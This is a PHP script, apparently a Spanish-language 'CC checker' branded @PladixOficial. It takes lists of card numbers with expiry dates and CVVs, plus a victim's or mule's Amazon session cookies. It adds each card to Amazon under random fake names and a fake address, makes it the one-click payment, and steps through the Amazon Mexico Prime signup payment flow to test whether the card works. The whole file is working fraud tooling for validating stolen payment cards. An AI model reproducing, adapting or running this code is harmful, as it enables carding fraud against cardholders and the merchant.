<?php
error_reporting(0);

function obtenercadena($cadena, $inicio, $fin){

$str = explode($inicio, $cadena);
$str = explode($fin, $str[1]);
return $str[0];

}

function obtenercadena2($cadena, $inicio, $fin, $linea = 1) {

$str = explode($inicio, $cadena);
$str = explode($fin, $str[$linea]);
return $str[0];

}

function multiexplode($delimitadores, $cadena){

$uno = str_replace($delimitadores, $delimitadores[0], $cadena);
$dos = explode($delimitadores[0], $uno);
return $dos;

}

$lista = str_replace(array(" "), '/', $_POST['lista']);
// $lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){

die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@PladixOficial</span><br>');
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function generarLetrasAleatorias($cantidad) {
$letras = 'abcdefghijklmnopqrstuvwxyz';
$tamañoLetras = strlen($letras);
$resultado = '';

for ($i = 0; $i < $cantidad; $i++) {
$indice = rand(0, $tamañoLetras - 1);
$resultado .= $letras[$indice];
}

return $resultado;
}

$cantidadLetras = 7; 
$letrasAleatorias = generarLetrasAleatorias($cantidadLetras);

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

// $cookieprim = $_GET['cookies'];

$cookieprim = $_POST['cookies'];

if($cookieprim == null){

die("¡Coloque las cookies de amazon.com.mx en el formulario de guardar cookies!");    
    
}

$cookieprim = trim($cookieprim);

function convertirCookie($texto, $formatoSalida = 'BR'){
$codigosPais = [
'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
];

if (!array_key_exists($formatoSalida, $codigosPais)) {
return $texto;
}

$paisActual = $codigosPais[$formatoSalida];

$texto = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $paisActual['code'], $texto);
$texto = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $paisActual['currency'], $texto);
$texto = preg_replace('/(' . $paisActual['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $paisActual['lc_value'], $texto);
$texto = str_replace('acbuc', $paisActual['code'], $texto);

return $texto;
}

function generarCadenaAleatoria($longitud = 12) {
$caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$longitudCaracteres = strlen($caracteres);
$cadenaAleatoria = '';
for ($i = 0; $i < $longitud; $i++) {
$cadenaAleatoria .= $caracteres[rand(0, $longitudCaracteres - 1)];
}
return $cadenaAleatoria;
}

$_com_cookie = convertirCookie($cookieprim, 'US');
$intentos = 3;

///////////////////////////////////////////////////////////////////////////////////////

function obtenerAbreviaturaEstado($estado) {
    $estados = [
        'Alabama' => 'AL', 'Alaska' => 'AK', 'Arizona' => 'AZ', 'Arkansas' => 'AR',
        'California' => 'CA', 'Colorado' => 'CO', 'Connecticut' => 'CT', 'Delaware' => 'DE',
        'Florida' => 'FL', 'Georgia' => 'GA', 'Hawaii' => 'HI', 'Idaho' => 'ID',
        'Illinois' => 'IL', 'Indiana' => 'IN', 'Iowa' => 'IA', 'Kansas' => 'KS',
        'Kentucky' => 'KY', 'Louisiana' => 'LA', 'Maine' => 'ME', 'Maryland' => 'MD',
        'Massachusetts' => 'MA', 'Michigan' => 'MI', 'Minnesota' => 'MN', 'Mississippi' => 'MS',
        'Missouri' => 'MO', 'Montana' => 'MT', 'Nebraska' => 'NE', 'Nevada' => 'NV',
        'New Hampshire' => 'NH', 'New Jersey' => 'NJ', 'New Mexico' => 'NM', 'New York' => 'NY',
        'North Carolina' => 'NC', 'North Dakota' => 'ND', 'Ohio' => 'OH', 'Oklahoma' => 'OK',
        'Oregon' => 'OR', 'Pennsylvania' => 'PA', 'Rhode Island' => 'RI', 'South Carolina' => 'SC',
        'South Dakota' => 'SD', 'Tennessee' => 'TN', 'Texas' => 'TX', 'Utah' => 'UT',
        'Vermont' => 'VT', 'Virginia' => 'VA', 'Washington' => 'WA', 'West Virginia' => 'WV',
        'Wisconsin' => 'WI', 'Wyoming' => 'WY'
    ];
    return $estados[$estado] ?? 'NY';
}

$tiempo = time();

///////////////////////////////////////////////////////////////////////////////////////

// $url = "https://randomuser.me/api/?nat=us";
// $response = file_get_contents($url);
// $data = json_decode($response, true);
// $result = $data['results'][0];
// $first_name = $result['name']['first'];
// $last_name = $result['name']['last'];
// $fullnamekk = "$first_name $last_name";
// $street = $result['location']['street']['number'] . ' ' . $result['location']['street']['name'];
// $city = $result['location']['city'];
// $state = obtenerAbreviaturaEstado($result['location']['state']);
// $country = $result['location']['country'];
// $postcode = $result['location']['postcode'];

///////////////////////////////////////////////////////////////////////////////////////

$primer_nombre = $letrasAleatorias;
$apellido = $letrasAleatorias;
$nombrecompleto = "$primer_nombre $apellido";
$calle = "1389 Tchesinkut Lake Rd";
$ciudad = "Fort Fraser";
$estado = "British Columbia";
$pais = "United States";
$codigo_postal = "V0J 1N0";

///////////////////////////////////////////////////////////////////////////////////////

// $ch = curl_init(); 
// curl_setopt_array($ch, [
//     CURLOPT_URL            => 'https://www.amazon.com/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account&openid.assoc_handle=usflex&shouldShowPasskeyLink=true&passkeyEligibilityArb=455b1739-065e-4ae1-820a-d72c2583e302&passkeyMetricsActionId=781d7a58-8065-473f-ba7a-f516071c3093', // cambio para cada país diferente...
//     CURLOPT_RETURNTRANSFER => true,
//     CURLOPT_SSL_VERIFYPEER => false,
//     CURLOPT_FOLLOWLOCATION => true,
//     CURLOPT_COOKIE         => $_com_cookie,
//     CURLOPT_ENCODING       => "gzip",
//     CURLOPT_HTTPHEADER     => array(
//         'Host: www.amazon.com',
//         'Upgrade-Insecure-Requests: 1',
//         'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
//         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
//         'X-Requested-With: com.amazon.mShop.android.shopping',
//         'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
//     ),
// ]);
// $r = curl_exec($ch);

// ///////////////////////////////////////////////////////////////////////////////////////

// if (strpos($r, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.")) {

// die('<span class="text-danger">Errores</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso passkey, haga clic en "Mi cuenta" y luego "Seguridad" e inicie sesión nuevamente. </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

// }else{}

$cookie2 = convertirCookie($cookieprim, 'US');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca', // cambio para cada país diferente...
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.dee.app',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$csrf = obtenercadena($r, 'csrfToken = "','"');

if ($csrf == null) {

die('<span class="text-danger">Errores</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso passkey, haga clic en "Mi cuenta" y luego "Seguridad" e inicie sesión nuevamente. </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax', // cambio para cada país diferente...
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.$primer_nombre.'+'.$apellido.'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.ca/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$cardid_puro = obtenercadena($r, '"paymentInstrumentId":"','"');

// {"AddPaymentInstr":{"success":true,"paymentInstrumentId":"0h_PU_CUS_78061e94-fc54-43eb-919d-2bd42ebeae57"}}

if (strpos($r, 'paymentInstrumentId')) {} else{

die('<span class="text-danger">Errores</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies no detectadas, entre en mi cuenta y luego seguridad e ingrese su contraseña para ver si vuelve a funcionar. </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
}

///////////////////////////////////////////////////////////////////////////////////////

function agregarDireccionAmazon($cookie2){

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.ca/a/addresses/add?ref=ya_address_book_add_button', // cambio para cada país diferente...
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'host: www.amazon.ca',
    'referer: https://www.amazon.ca/a/addresses?ref_=ya_d_c_addr&claim_type=EmailAddress&new_account=1&',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);
$obtenerDireccionAmazon = curl_exec($curl);
curl_close($curl);

///////////////////////////////////////////////////////////////////////////////////////

$tokencsrfdir = urlencode(obtenercadena($obtenerDireccionAmazon, "type='hidden' name='csrfToken' value='","'"));
$direcciondejwt = obtenercadena($obtenerDireccionAmazon, 'type="hidden" name="address-ui-widgets-previous-address-form-state-token" value="','"');
$idcliente = obtenercadena($obtenerDireccionAmazon, '"customerID":"','"');
$interaccionid = obtenercadena($obtenerDireccionAmazon, 'name="address-ui-widgets-address-wizard-interaction-id" value="','"');
$tiempoinicio = obtenercadena($obtenerDireccionAmazon, 'name="address-ui-widgets-form-load-start-time" value="','"');
$idpeticion = obtenercadena($obtenerDireccionAmazon, '=AddView&hostPageRID=','&' , 1);
$tokencsv2 = urlencode(obtenercadena($obtenerDireccionAmazon, 'type="hidden" name="address-ui-widgets-csrfToken" value="','"'));
$telefonoaleatorio = rand(1111,9999);

///////////////////////////////////////////////////////////////////////////////////////

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.ca/a/addresses/add?ref=ya_address_book_add_post', // cambio para cada país diferente...
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'csrfToken='.$tokencsrfdir.'&addressID=&address-ui-widgets-countryCode=CA&address-ui-widgets-enterAddressFullName='.$primer_nombre.'+'.$apellido.'&address-ui-widgets-enterAddressPhoneNumber=250690'.$telefonoaleatorio.'&address-ui-widgets-enterAddressLine1=1389+Tchesinkut+Lake+Rd&address-ui-widgets-enterAddressLine2=&address-ui-widgets-enterAddressCity=Fort+Fraser&address-ui-widgets-enterAddressStateOrRegion=British+Columbia&address-ui-widgets-enterAddressPostalCode=V0J+1N0&address-ui-widgets-previous-address-form-state-token='.$direcciondejwt.'&address-ui-widgets-use-as-my-default=true&address-ui-widgets-delivery-instructions-desktop-expander-context=%7B%22deliveryInstructionsDisplayMode%22+%3A+%22CDP_ONLY%22%2C+%22deliveryInstructionsClientName%22+%3A+%22YourAccountAddressBook%22%2C+%22deliveryInstructionsDeviceType%22+%3A+%22desktop%22%2C+%22deliveryInstructionsIsEditAddressFlow%22+%3A+%22false%22%7D&address-ui-widgets-addressFormButtonText=save&address-ui-widgets-addressFormHideHeading=true&address-ui-widgets-heading-string-id=&address-ui-widgets-addressFormHideSubmitButton=false&address-ui-widgets-enableAddressDetails=true&address-ui-widgets-returnLegacyAddressID=false&address-ui-widgets-enableDeliveryInstructions=true&address-ui-widgets-enableAddressWizardInlineSuggestions=false&address-ui-widgets-enableEmailAddress=false&address-ui-widgets-enableAddressTips=true&address-ui-widgets-amazonBusinessGroupId=&address-ui-widgets-clientName=YourAccountAddressBook&address-ui-widgets-enableAddressWizardForm=true&address-ui-widgets-delivery-instructions-data=%7B%22initialCountryCode%22%3A%22CA%22%7D&address-ui-widgets-ab-delivery-instructions-data=&address-ui-widgets-address-wizard-interaction-id='.$interaccionid.'&address-ui-widgets-obfuscated-customerId='.$idcliente.'&address-ui-widgets-locationData=&address-ui-widgets-enableLatestAddressWizardForm=true&address-ui-widgets-avsSuppressSoftblock=false&address-ui-widgets-avsSuppressSuggestion=false&address-ui-widgets-csrfToken='.$tokencsv2.'&address-ui-widgets-form-load-start-time='.$tiempoinicio.'&address-ui-widgets-clickstream-related-request-id='.$idpeticion.'&address-ui-widgets-locale=',
  CURLOPT_HTTPHEADER => [
    'content-type: application/x-www-form-urlencoded',
    'host: www.amazon.ca',
    'origin: https://www.amazon.ca',
    'referer: https://www.amazon.ca/a/addresses/add?ref=ya_address_book_add_button',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);

$agregarDireccionValida = curl_exec($curl);
curl_close($curl);

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax', // cambio para cada país diferente...
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.ca/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$id_direccion = obtenercadena($r, 'AddressId":"','"');

if(empty($id_direccion)) {

agregarDireccionAmazon($cookie2);

die('<span class="text-danger">Errores</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Se registró una dirección, verifique en su cuenta e intente nuevamente. </span> ➔ Tiempo de respuesta: (' . (time() - $tiempo) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax', // cambio para cada país diferente...
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$id_direccion.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.ca/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

// {"SetOneClickPayment":{"success":true,"paymentInstrumentId":"0h_PU_CUS_97e734b3-53da-41cd-8449-7edfe52d248d"}}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo', // cambio para cada país diferente...
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.mShop.android.shopping',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$mercado = obtenercadena($r, "ue_mid = '","'");
$estadowidget = obtenercadena($r, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"','"');
$idCliente = obtenercadena($r, 'customerId":"','"');
$idInstanciaWidget = obtenercadena($r, 'widgetInstanceId":"','"');
$id_sesion   = obtenercadena($r, '"sessionId":"', '"');
$removdps   = obtenercadena($r, '"testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"'); // token inútil...

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$idCliente.'/continueWidget',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'ppw-jsEnabled=true&ppw-widgetState='.$estadowidget.'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId='.$cardid_puro.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/'.$idInstanciaWidget.'',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.amazon.com',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',

)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$pago = obtenercadena($r, '"paymentMethodId\":\"','\"');
$cookie2 = convertirCookie($cookieprim, 'MX');
// ,\"paymentMethodId\":\"amzn1.pm.wallet.MGhfUFVfQ1VTXzk3ZTczNGIzLTUzZGEtNDFjZC04NDQ5LTdlZGZlNTJkMjQ4ZA.QVRJWUdYMUNXSjRIWg\",

///////////////////////////////////////////////////////////////////////////////////////

$cookieUS1 = 'amazon.com.mx';

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://".$cookieUS1."/gp/prime/pipeline/membersignup",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1",
CURLOPT_HTTPHEADER     => array(
"Host: $cookieUS1",
"content-type: application/x-www-form-urlencoded",
),
]);

$resultado = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$widget90 = obtenercadena($resultado, 'ppw-widgetState&quot; value=&quot;','&');
$sesionds = obtenercadena($resultado, 'Subs:Prime&quot;,&quot;session&quot;:&quot;','&');
$idCliente = obtenercadena($resultado, 'customerId&quot;:&quot;','&');
$nuevotoken = obtenercadena($resultado, ',&amp;quot;instrumentIds&amp;quot;:[&amp;quot;','&');
$token1 = obtenercadena($resultado, 'payment-preference-summary-form&quot;,&quot;selectedInstrumentIds&quot;:[&quot;','&');
$token2 = obtenercadena($resultado, 'Subs:Prime&quot;,&quot;serializedState&quot;:&quot;','&');

///////////////////////////////////////////////////////////////////////////////////////

$url92 = 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$idCliente.'/continueWidget';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url92);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$token2."&ie=UTF-8");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/confirm';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resultado = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$token3 = obtenercadena($resultado, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
$token4 = obtenercadena($resultado, 'data-instrument-id=\"','\"');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$idCliente.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$token3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/r9R8zQ8Dgh1b';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/membersignup';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resultado = curl_exec($ch);
curl_close($ch);

